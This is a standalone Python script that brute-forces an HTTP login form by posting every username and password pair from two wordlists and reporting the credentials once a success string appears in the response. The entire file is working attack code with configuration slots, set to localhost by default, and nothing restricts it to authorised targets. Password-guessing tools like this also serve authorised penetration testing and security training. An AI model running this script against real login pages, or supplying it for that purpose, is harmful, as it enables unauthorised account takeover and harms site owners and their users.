import requests
import sys

def brute_force_http(target_url, username_list_path, password_list_path, username_field, password_field, success_string):
    """
    Performs a brute-force attack on an HTTP login form.

    Args:
        target_url (str): The URL of the login page (e.g., "http://example.com/login.php").
        username_list_path (str): Path to the username wordlist file.
        password_list_path (str): Path to the password wordlist file.
        username_field (str): The 'name' attribute of the username input field in the form.
        password_field (str): The 'name' attribute of the password input field in the form.
        success_string (str): The string expected in the response upon successful login.
    """
    print(f"[*] Starting HTTP brute force on: {target_url}")
    
    usernames = []
    passwords = []

    try:
        with open(username_list_path, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open(password_list_path, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Error: Ensure '{username_list_path}' and '{password_list_path}' files exist.")
        sys.exit(1)

    if not usernames or not passwords:
        print("[-] Error: Username or password wordlist is empty. Please check your files.")
        sys.exit(1)

    found = False
    attempt_count = 0

    for username in usernames:
        for password in passwords:
            attempt_count += 1
            data = {
                username_field: username,
                password_field: password
            }
            try:
                # Use POST request for login forms
                response = requests.post(target_url, data=data, timeout=5)
                print(f"[*] Attempt {attempt_count}: {username}:{password} -> Status: {response.status_code}")

                # Check if the success string is in the response text
                if success_string in response.text:
                    print(f"\n[+] Credentials found after {attempt_count} attempts!")
                    print(f"[+] Username: {username}")
                    print(f"[+] Password: {password}")
                    found = True
                    break # Stop if found
            except requests.exceptions.RequestException as e:
                print(f"[-] Connection error or timeout: {e}")
                # Continue to the next attempt, don't stop the whole process
                continue
        if found:
            break

    if not found:
        print(f"\n[-] No matching credentials found after {attempt_count} attempts.")

if __name__ == "__main__":
    # --- CONFIGURE THESE VALUES ---
    # Target URL of the web login page.
    TARGET_URL = "http://localhost/login.php" 
    
    # The 'name' attribute of the username input field in the HTML form.
    USERNAME_FIELD_NAME = "username"           
    
    # The 'name' attribute of the password input field in the HTML form.
    PASSWORD_FIELD_NAME = "password"           
    
    # A unique string that will appear in the HTML response upon successful login.
    SUCCESS_INDICATOR = "Welcome to Dashboard" # Example: "Welcome", "Dashboard", "You are logged in"

    # Paths to the username and password wordlist files.
    USERNAME_WORDLIST = "usernames.txt"
    PASSWORD_WORDLIST = "passwords.txt"
    # ----------------------------

    brute_force_http(
        TARGET_URL,
        USERNAME_WORDLIST,
        PASSWORD_WORDLIST,
        USERNAME_FIELD_NAME,
        PASSWORD_FIELD_NAME,
        SUCCESS_INDICATOR
    )
